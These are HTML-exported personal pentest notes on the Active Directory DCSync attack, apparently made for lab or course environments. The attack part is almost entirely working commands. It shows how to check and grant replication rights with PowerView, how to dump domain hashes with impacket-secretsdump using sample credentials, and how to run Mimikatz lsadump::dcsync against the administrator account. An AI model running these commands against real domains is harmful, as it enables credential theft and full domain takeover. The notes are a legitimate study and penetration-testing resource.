<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>02-dcsync</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>02-dcsync</h1><br/><p><h2>Situation:</h2><ul><li><h3>user has Replication Directory changes permissions</h3></li><li><h3> practically attacker will try to overtake Microsoft exchange group which has this permission by default </h3></li></ul><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3></h3><h2>Exploit :</h2><ul><li><h3> Â you have some basic creds</h3></li><li><h3> secretsdump.py htb.local/user:passwsord1@sc.htb.local</h3></li></ul><h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><h2>DCSYNC privesc powershell</h2></p><p><ul><li>check for DCsync rights of student317<ul><li>Get-ObjectAcl -DistinguishedName &quot;dc=dollarcorp,dc=moneycorp,dc=local&quot; -ResolveGUIDs | ? {($_.IdentityReference -match &quot;student317&quot;) -and (($_.ObjectType -match &#39;replication&#39;) -or ($_.ActiveDirectoryRights -match &#39;GenericAll&#39;))}</li></ul></li><li>Add dcync rights <ul><li>Add-ObjectAcl -TargetDistinguishedName &quot;dc=dollarcorp,dc=moneycorp,dc=local&quot; -PrincipalSamAccountName student317 -Rights DCSync -Verbose</li></ul></li><li>Exploit dcsync<ul><li>Invoke-Mimikatz -Command &#39;&quot;lsadump::dcsync /user:garrison\administrator&quot;&#39;</li><li>note : user can be any user we want fetch e.g administrator </li></ul></li></ul></p><p><h3></h3></p><p><h3> </h3></p><p><strong><h2>Exploit</h2></strong></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># on linux </span><br />impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:<span style="color:#3ad900;font-weight:400">&quot;BrouhahaTungPerorateBroom2023\!&quot;</span>@192.168.50.70<br /><br /><span style="color:#0088ff;font-weight:400"># on windows : mimikatz </span><br />lsadump::dcsync <span style="color:#ff9d00;font-weight:700">/</span>user:corp<span style="color:#333333;font-weight:400">\d</span>ave</pre></div></p></div>
</body>
</html>
